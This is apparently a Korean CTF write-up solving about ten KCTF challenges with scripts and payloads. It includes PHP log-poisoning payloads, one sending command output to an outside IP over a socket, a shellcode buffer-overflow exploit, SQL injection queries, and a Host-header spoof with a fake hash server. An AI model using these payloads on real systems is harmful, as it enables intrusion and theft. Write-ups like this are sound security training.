# Baby Crypto
문제에서 사용되는 변수, 이름 등을 통해 rsa와 관련된 암화체계라고 예상할 수 있음
이를 통해 gpt를 이용해 해답을 구할 수 있었음


![[스크린샷 2023-12-21 171241.png]]

![[스크린샷 2023-12-21 174601 1.png]]
```
761269를 소인수 분해하면 809,941 가 나와 결국 개인키도 알아낸 셈이야. 이를 통해 Crypted-FLAG 배열에 있는 암호문을 복호화할 수 있지 않겠어?

ChatGPT
네, 761269를 809와 941로 소인수 분해했다면, 이는 RSA 암호의 'n' 값을 소인수분해한 것으로, 개인 키를 찾는 데 필수적인 단계입니다. RSA에서 'n'은 두 소수의 곱(p*q)이며, 이제 두 소수를 알고 있으므로 필요한 다른 값들을 계산할 수 있습니다.

RSA에서 개인 키는 'd'로 표시되며, 이는 'e'에 대한 모듈러 역수로, 
 ...
 
ϕ(n)을 계산하고, 그 다음 'd'를 찾으며, 마지막으로 각 암호문을 복호화하겠습니다.

복호화된 메시지는 숫자 배열로 나타났습니다. 이 숫자들은 아마도 ASCII 코드에 해당할 것입니다. ASCII 코드를 문자로 변환하면 실제 메시지를 볼 수 있을 겁니다. 변환해 보겠습니다. ​​

복호화된 메시지는 "KCTF{EAsY_cRYPt0_f1GHt1ng_KKnock}"입니다. 이것이 원래의 암호문에서 숨겨진 내용으로 보입니다. 
```



# 금고 안에 숨긴 암호 찾기
해당 파일은 jpg 파일로 시그니처를 확인하여 푸터의 위치를 확인할 수 있음
그 뒤에 프로그램이 더 있는 걸 알 수 있는데 해당 부분을 추출해 시그니처를 확인하면 압축파일 내부에 음성파일이 나오게 됨

해당 음성파일의 소리를 감청하면 아래와 같은 메시지를 확인할 수 있고 파형 분석 툴을 이용하여 flag를 얻을 수 있음

![[스크린샷 2023-12-22 232225.png]]

![[스크린샷 2023-12-22 234533.png]]

![[스크린샷 2023-12-22 234538.png]]

![[스크린샷 2023-12-22 234646.png]]




# 숨긴 암호 찾기!
png파일내부에는 헤더에 이상이 있는지 체크하는 crc 체크섬이 있는데 이를 이용해 의도적으로 작게 설정된 파일의 크기를 복원할 수 있음 

0x10부터가 크기 관련 정보 0x10줄 마지막이 crc 체크섬섬
![[스크린샷 2023-12-21 140413.png]]
크기에 비해 용량이 비이상적으로 큼
![[스크린샷 2023-12-21 143559.png]]

아래는 위의 내용을 이용해 크기를 알아내는 코드임
```python
import os

import binascii

import struct

  

misc = open("target.png","rb").read()

  

for i in range(2000):

    for j in range(2000):

        data = misc[12:16] + struct.pack('>i',i) + struct.pack('>i',j)+ misc[24:29]

        crc32 = binascii.crc32(data) & 0xffffffff

        if crc32 == 0xD6FEE5F4: # CRC32

            print(struct.pack('>i',i)+ struct.pack('>i',j))
```

이를통해 헤더를 다시 복원하고 열면 flag를 획득할 수 있음

![[스크린샷 2023-12-21 165955.png]]



# 생존신고
디코에 자유채널에 나와있음
![[스크린샷 2023-12-21 162110.png]]



# Mic check
파이썬을 이용해 계산기를 구현하였음.
여러가지 필터링이 있었지만 아래와 같이 코드 스니펫을 입력하면 flag를 얻을 수 있음 
![[스크린샷 2023-12-21 115442.png]]

파이썬 내부에서 서브프로세스 모듈을 이용해 flag를 출력하는 명령어 실행 결과를 다시 출력함



# Mine sweeper
웹 프록시툴로 난이도 조절을 하는 파라미터를 변조하여 다른 난이도 페이지에 접근할 수 있음을 알 수 있었고,
게임에 대한 토큰과 유저의 대한 토큰을 따로 관리하여, 다른 유저의 대한 권한으로 힌트를 사용하여 모든 위치에 폭탄 유무를 확인할 수 있었음
실제로는 그냥 토큰에 대한 언급을 하지 않았음, 만약 토큰을 유효하지 않을걸 보내면 엉뚱한 위치정보를 알려주고, 유효한 토큰을 보내면 기회가 3번밖에 없어서 요청이 제한됨
시행착오가 많았지만 아래 함수들을 조합하여 문제를 해결할 수 있음

```python
import requests
import random

# KCTF{Art_Is_eXpL0Si0n__Gatsu!!!!!}

SIZE=10
DIFFICULTY="easy"

board=[[0 for _ in range(SIZE)]for _ in range(SIZE)]

def start():
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
    }
    data = {
        "difficulty": DIFFICULTY
    }
    response=requests.post("http://3.34.189.239:3000/new", headers=headers, data=data, allow_redirects=False)
    return response.headers['Location'].split(";")[0],response.headers['Location'].split(";")[1][11:]
    


def move(row, col, url, jsc):
    for i in range(row):
        for j in range(col):
            #if random.random() < 0.12:
                headers = {
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Cookie": "JSESSIONID=" + jsc
                }

                data = {
                    "row": i,
                    "col": j
                }
                response = requests.post(url, headers=headers, data=data)

                if("Game lost :(" in response.text):
                    print(f"Row: {i}, Col: {j}, Result: false")
                    return False

                #return True
                print(f"Row: {i}, Col: {j}, Result: success")
    
    return True


def move_once(row, col, url, jsc):
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        #"Cookie": "JSESSIONID=" + jsc
    }
    data = {
        "row": row,
        "col": col
    }

    requests.post(url, headers=headers, data=data)



def check(row, col, url,jsc):
    for i in range(row):
        for j in range(col):
            headers = {
                "Content-Type": "application/x-www-form-urlencoded",
                #"Cookie": "JSESSIONID=" + jsc
            }

            tmp="http://3.34.189.239:3000/api/checkMine?gameId={}&difficulty={}&row={}&col={}".format(url[30:],DIFFICULTY,i,j)
            response = requests.post(tmp, headers=headers)

            print(i,j,len(response.text))

            # if "error processing" not in response.text:
            if "Mine found!" in response.text:
                board[i][j]=1

    


if __name__ == '__main__':
    url,jsc=start()
    # while(True):
    #     if(move(15,15,url)):
    #         print(url)
    #         break
    #     else:  
    #         url=start()

    print(url)
    check(SIZE,SIZE,url,jsc)
    for i in range(SIZE):
        for j in range(SIZE):
            if board[i][j]==0:
                move_once(i,j,url,jsc)

    [print(row) for row in board]
    print(url)
```

![[스크린샷 2023-12-22 033045.png]]
![[스크린샷 2023-12-22 033503.png]]
![[스크린샷 2023-12-22 033315.png]]
# 이 웹사이트 비밀번호 인증이 이상하다..?
해당 서버에서는 비밀번호 해시값을 받는 api를 통해 인증함
이를 통해 admin의 해심값을 얻어낼 수 있지만 sha256 해시값을 크랙하는건 사실상 불가능함
그런데 서버 코드에 요청 패킷의 host필드를 참조하는 코드가 있는데, 서버 입장에서는 서버 내부 api를 통해 비밀번호 해시값을 가져오기를 기대함.
하지만 클라이언트는 이 정보를 위조할 수 있으므로 공격자 서버 주소를 host 필드에 넣어 조작된 해시값이 전달되게 위조
이를 통해 실제 admin의 비밀번호 정보 없이 토큰을 얻어 올 수 있음
![[Pasted image 20231223211009.png]]

요청 스크립트
```python
# import requests

# # 요청할 URL
# url = "http://3.34.189.239:8888/login"

# # POST 요청에 포함될 데이터
# data = {
#     "id": "admin",
#     "password": "asdf"
# }

# # 필요한 헤더만 지정
# headers = {
#     "Host": "211.250.216.249:3000",
#     "Content-Type": "application/x-www-form-urlencoded",
#     "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
#     "Origin": "http://3.34.189.239:8888",
#     "Referer": "http://3.34.189.239:8888/login",
#     "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
# }

# # POST 요청 보내기
# response = requests.post(url, data=data, headers=headers)

# # 응답 내용 출력
# print(response.status_code)
# print(response.text)


import http.client

# 서버의 IP와 포트를 설정합니다.
conn = http.client.HTTPConnection("3.34.189.239", 8888)

# 요청할 페이로드를 설정합니다.
payload = "id=admin&password=asdf"

# 필요한 헤더를 설정합니다.
headers = {
    "Host": "211.250.216.249:3000",
    "Content-Type": "application/x-www-form-urlencoded",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "Origin": "http://3.34.189.239:8888",
    "Referer": "http://3.34.189.239:8888/login",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
}

# POST 요청을 보냅니다.
conn.request("POST", "/login", payload, headers)

# 응답을 받습니다.
response = conn.getresponse()

# 응답 내용을 출력합니다.
print(response.status, response.reason)
print(response.read().decode())
print(response.getheader('Set-Cookie'))


```

공격 서버
```js
const express = require("express");
const crypto = require("crypto");

const app = express();

//"asdf" -> f0e4c2f76c58916ec258f246851bea091d14d4247a2fc3e18694461b1816e13b
app.get("/password/admin", (req, res) => {
  const hash = crypto.createHash("SHA256").update("asdf").digest("hex");
  console.log(`signal in`);
  console.log(hash);
  res.send(hash);
});

const PORT = 3000; // HTTP 기본 포트
app.listen(PORT, () => {
  console.log(`Server running on http://211.250.216.249:${PORT}`);
});

```

콘솔에 출력된 쿠키를 이용해 플래그를 얻을 수 있음
![[스크린샷 2023-12-22 175306.png]]
![[스크린샷 2023-12-22 163616.png]]



# I'am not a bot
user-agent를 변조하는 문제임
헤더를 변조해 log poisoning하는 문제인 줄 알았으나 유효하지 않았음

```

GET /index.html HTTP/1.1
Host: target.com
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; 
             Trident/5.0; <?php system($_GET['cmd']); ?>)


GET /index.html HTTP/1.1
Host: target.com
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; 
             Trident/5.0; <?php
    $output = shell_exec('ls');
    $sock = fsockopen('211.250.216.249', 7000);
    fwrite($sock, $output);
    fclose($sock);
?>

```

특수문자 넣다보니 sqli인걸 알게됨

`User-Agent: admin" or "1"="1` 를 통해 서버에 접속을 할 수 있었으나, ip가 올바르지 않다고 reject당함
sqli를 통해 db 정보를 유출해야 함

구글링을 통해 DBMS 특정할 수 있는 다양한 쿼리를 사용하여 sqlite임을 알아냈고 이를 이용하여
시스템 테이블 탐색 시작 응답 패킷을 통해 하나의 정보를 유출시킬 수 있는데 아래 쿼리들을 통해 하나씩 정보를 얻어내
whitelist ip를 얻어냄

```
admin" OR "1"="1" AND sqlite_version() LIKE "3%"; --
admin" union select tbl_name from sqlite_master; --
admin" union select tbl_name from sqlite_master limit 1 offset 2; --	->white_list
admin" UNION SELECT sql FROM sqlite_master WHERE type="table" AND name="white_list"; --
CREATE TABLE white_list (
                    no INTEGER NOT NULL,
                    ip TEXT NOT NULL UNIQUE,
                    PRIMARY KEY (no)
                )"}

admin" UNION SELECT ip from white_list; --	->19.98.12.18
```

이를 X-Forwarded-For 필드에 넣어 플래그를 얻을 수 있음

```python
# import requests

# url = "http://kknock.org:10002/api/bot_check"

# #and ascii(substring((select schema_name from information_schema.schemata limit 1), 1, 1))<79;

# headers = {
#     "User-Agent": 'admin" UNION SELECT ip from white_list limit 1 offset 1; --',
#     "Accept": "*/*",
#     "Referer": "http://kknock.org:10002/login",
#     "Accept-Language": "ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7",
# }

# response = requests.get(url, headers=headers)

# print(response.text)

import requests

url = 'http://kknock.org:10002/login'
headers = {
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': 'a" union select "19.98.12.18";-- -',
    'Referer': 'http://kknock.org:10002/login',
    'Cookie': 'session=.eJxNy0sKgCAURuGtXP6xCjZS24ogFpcQ6go-RtHea9j0fJwbWx1J8sUIsN54Z-xirINC6ekzhNEmK8zOLeWD5SvIETSlVKHOJ--D4v-NWLUmjecFL4YbLQ.ZYZPhA.5xcfW1ZmBWteeW6chi7sbA9NQgw',
    'Host' : "19.98.12.18",
    'X-Forwarded-For' : "19.98.12.18"
}
data = {
    'password': 'djenadls~?'
}
proxies = {
    'http': 'http://19.98.12.18:80',
    'https': 'http://19.98.12.18:443'
}

response = requests.post(url, headers=headers, data=data)
print(response.text)

#KCTF{X_F0Rw4RD3D_4_and_s1Mp1e_5qli}
```



# Blue Flame
리턴주소를 완벽히 변조할 수는 없어도 마지막 한바이트는 변조할 수 있음을 이용해 아래와 같이 패이로드를 보낼 수 있음

```python
from pwn import *

#p=process("./blue-flame")
#p=gdb.debug("./blue-flame")
#p=remote("host3.dreamhack.games", 14505)
p=remote("kknock.org", 10007)
context.log_level="debug"

shellcode=b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'

p.recvline()
p.recvuntil(b'0x')
buf=int(p.recv(8),16)

nonce=(buf-4)&0xff
nonce=nonce.to_bytes(1,byteorder='little')

payload=p32(buf+4)
payload+=shellcode.rjust(0x34,b'a')
payload+=nonce

p.send(payload)

p.interactive()

# KCTF{Th15_15_r34l_f14g_h4h4}
```



# Incubator Baby Rev
역산이 어려움을 이용하여 섞는 순서자체를 기억하여 문제를 해결하였음


```python
import random

actions=[133, 642, 796, 504, 505, 157, 334, 829, 405, 26, 480, 827, 822, 678, 126, 107, 720, 348, 217, 685, 740, 528, 445, 587, 204, 161, 999, 507, 733, 47, 810, 820, 870, 491, 3, 719, 554, 761, 351, 425, 112, 220, 95, 430, 287, 873, 908, 363, 142, 580, 1019, 853, 954, 15, 613, 1000, 672, 353, 402, 1003, 171, 470, 831, 266, 499, 330, 557, 627, 983, 787, 910, 723, 811, 121, 255, 152, 477, 674, 644, 19, 968, 164, 969, 292, 722, 588, 976, 82, 551, 382, 798, 55, 213, 248, 214, 553, 664, 982, 772, 923, 233, 767, 681, 994, 602, 869, 210, 865, 758, 237, 283, 341, 349, 34, 212, 388, 519, 487, 542, 635, 1007, 22, 291, 807, 626, 465, 176, 459, 749, 228, 938, 1016, 925, 456, 178, 871, 568, 836, 468, 530, 763, 840, 575, 842, 556, 203, 679, 803, 278, 546, 918, 70, 433, 200, 764, 250, 785, 896, 515, 791, 506, 730, 23, 913, 10, 29, 595, 166, 46, 890, 543, 438, 299, 566, 844, 665, 104, 632, 660, 597, 33, 323, 263, 389, 63, 8, 76, 198, 769, 527, 86, 285, 473, 648, 155, 614, 139, 804, 560, 690, 839, 113, 823, 848, 583, 94, 281, 964, 240, 83, 301, 950, 537, 293, 878, 966, 59, 975, 108, 1015, 594, 276, 703, 423, 414, 995, 852, 780, 656, 201, 617, 335, 874, 531, 501, 956, 370, 927, 864, 578, 190, 79, 935, 936, 290, 817, 934, 845, 169, 609, 422, 687, 216, 606, 409, 550, 151, 779, 441, 377, 484, 1005, 962, 800, 177, 638, 889, 960, 940, 9, 410, 367, 488, 346, 123, 888, 841, 850, 637, 337, 122, 376, 916, 745, 447, 1010, 360, 381, 861, 943, 899, 572, 308, 306, 1001, 777, 256, 799, 156, 548, 961, 416, 774, 148, 790, 192, 331, 691, 885, 391, 215, 458, 2, 92, 715, 752, 236, 304, 559, 184, 891, 314, 189, 765, 342, 384, 972, 987, 318, 591, 313, 57, 380, 1021, 826, 946, 69, 523, 830, 882, 736, 901, 706, 518, 895, 495, 74, 797, 835, 51, 522, 563, 328, 647, 540, 224, 600, 332, 675, 289, 160, 253, 25, 816, 373, 727, 311, 721, 593, 181, 361, 932, 739, 191, 933, 493, 875, 770, 211, 309, 242, 634, 939, 419, 49, 174, 768, 746, 598, 316, 509, 707, 756, 979, 232, 713, 106, 801, 502, 611, 395, 879, 692, 344, 724, 275, 475, 967, 153, 252, 80, 970, 516, 415, 650, 131, 297, 345, 448, 653, 355, 48, 742, 352, 440, 743, 472, 959, 429, 718, 584, 494, 524, 789, 30, 28, 1018, 270, 625, 305, 81, 616, 629, 977, 109, 1009, 73, 383, 295, 149, 937, 621, 945, 917, 571, 100, 347, 837, 651, 454, 128, 369, 630, 187, 781, 694, 624, 996, 461, 693, 709, 5, 116, 243, 636, 435, 851, 310, 582, 114, 552, 453, 150, 782, 467, 431, 350, 466, 432, 544, 96, 794, 303, 420, 426, 91, 340, 272, 884, 545, 130, 103, 60, 1017, 620, 619, 605, 971, 569, 655, 1014, 784, 688, 219, 307, 141, 101, 728, 56, 599, 239, 700, 482, 31, 245, 397, 915, 199, 1008, 268, 443, 386, 753, 981, 561, 904, 510, 538, 951, 689, 990, 953, 0, 670, 407, 657, 317, 358, 327, 825, 208, 227, 702, 534, 590, 202, 446, 525, 900, 1022, 641, 640, 71, 437, 754, 496, 737, 88, 903, 67, 725, 926, 833, 115, 533, 167, 4, 455, 1011, 249, 13, 64, 427, 85, 339, 931, 868, 783, 298, 449, 238, 857, 338, 732, 209, 50, 41, 698, 824, 365, 497, 205, 957, 567, 99, 880, 786, 408, 776, 704, 428, 442, 140, 649, 898, 436, 930, 390, 773, 645, 279, 809, 555, 374, 154, 462, 21, 271, 398, 514, 320, 705, 235, 919, 72, 359, 980, 952, 955, 858, 434, 912, 788, 439, 241, 471, 517, 78, 806, 129, 43, 997, 144, 618, 699, 677, 175, 673, 958, 526, 866, 326, 541, 65, 75, 949, 145, 610, 511, 671, 608, 84, 843, 652, 669, 77, 998, 469, 695, 883, 892, 792, 701, 396, 886, 206, 464, 601, 117, 818, 658, 585, 230, 513, 52, 586, 914, 229, 579, 264, 159, 778, 179, 573, 490, 387, 508, 928, 119, 795, 646, 401, 846, 489, 32, 478, 385, 262, 662, 965, 120, 859, 710, 147, 564, 20, 581, 183, 226, 755, 907, 124, 659, 821, 288, 300, 137, 277, 536, 222, 860, 897, 978, 941, 989, 379, 400, 225, 322, 922, 948, 738, 731, 11, 667, 993, 814, 66, 832, 834, 172, 280, 512, 476, 604, 168, 372, 680, 872, 1020, 17, 6, 294, 1, 254, 413, 185, 751, 520, 924, 760, 110, 354, 14, 162, 483, 207, 274, 234, 682, 404, 717, 247, 118, 134, 45, 35, 532, 418, 876, 623, 188, 196, 89, 231, 58, 286, 463, 547, 663, 729, 539, 676, 193, 481, 125, 654, 503, 639, 762, 366, 838, 615, 711, 631, 1012, 93, 343, 812, 854, 498, 221, 329, 257, 261, 452, 992, 974, 260, 132, 371, 991, 988, 577, 893, 607, 479, 815, 61, 194, 775, 368, 828, 399, 867, 929, 186, 856, 378, 881, 105, 596, 44, 684, 1002, 963, 986, 321, 633, 741, 282, 748, 393, 849, 244, 39, 296, 492, 40, 589, 136, 325, 246, 944, 258, 315, 696, 197, 267, 324, 356, 16, 457, 1013, 793, 36, 90, 744, 173, 1004, 421, 947, 424, 38, 906, 460, 813, 683, 18, 712, 592, 259, 757, 500, 819, 265, 284, 165, 734, 984, 877, 485, 628, 894, 622, 302, 111, 7, 668, 394, 535, 138, 766, 417, 855, 411, 333, 909, 180, 747, 62, 863, 905, 37, 195, 808, 357, 312, 163, 771, 158, 486, 529, 802, 170, 269, 661, 403, 336, 750, 392, 574, 708, 902, 805, 562, 375, 887, 12, 97, 182, 87, 942, 24, 716, 973, 521, 714, 612, 576, 135, 570, 143, 565, 412, 549, 643, 726, 68, 666, 474, 921, 1023, 223, 558, 251, 364, 1006, 319, 603, 735, 406, 920, 444, 218, 27, 127, 42, 450, 53, 146, 911, 273, 362, 862, 697, 98, 847, 686, 102, 985, 54, 759, 451]

def reverse_shuffle(s):
    restored = ['']*len(s)
    for i, j in enumerate(actions):
        restored[j] = s[i]
    return ''.join(restored)

if __name__ == "__main__":
    shuffled_flag_file = "shuffled_flag_origin.txt"
    real_flag_file = "real_flag.txt"

    with open(shuffled_flag_file, "r") as f:
        shuffled_flag = f.read().strip()

    shuffled_flag = [a for a in shuffled_flag]
    print(shuffled_flag)

    real_flag = reverse_shuffle(shuffled_flag)
    print(real_flag)

    # with open(real_flag_file, "w") as f:
    #     f.write(real_flag)

    # print("Real flag has been obtained and saved in real_flag.txt.")


#KCTF{72f6bb3aed5a0d5dc2bd89c8c6f35fb56739fbf16eeecbc0cd8394092ac56aab979fbdbef57efed09472948303f2e8565e6d6dc150821d04871716e76f775efb5869b040b1b9930bbf7ba16b258ad2dcc7f05e79d4321c0378d00950d31b7ddd7739211c1d2cebf9287d9eec9dd16a958086cb74f463d09a4414bcfc47bbb3626ddba2bc53dc379e680940508e83f109a75b79e91d6bdb0e54d6425fc77c6a3e4ca8cd14d469e3c9bafedcd3573865df88b08c1413e00177b38fe05292a5cf3758a0fdf8f1a33a0974b14d244003ad2701ad2b874920900f4042e5bb9bb07f10d955c1408277be3e1c4a5ec151c73fffacc046ac87030649e2887dd07cf02d6a29ccd321880438e9ddd6e23c0b9026c46f461d2fe7423e01551ee2f22f59a2019dead3d9e551021fa0057f5ec748c84d33086e93bb77a9a440664640ec33d61239a912d7a3b5c670ac32c7d70e124db95b12a210553200720f6d90b7b5844a19f2adb81a9d1178387cb4a699c15550cff94f8767903b7abe567eaa9aeb5fc41034132b9b7ed31603a4d5995fc3a678972dbb7d10e51e0dc133a5270181cb819975b976c294c5221f300304a9f9cd4805301464333b0c620198b30341eeb3defb4e33b2ea9cf4e253dcdb6ab3561c5f2b09942e3ec8ca46565f9d6c03161e4742f1472dd147257f33deba50c6b7e115d8a8c1af4e329003a8edb1dc04ad}
```


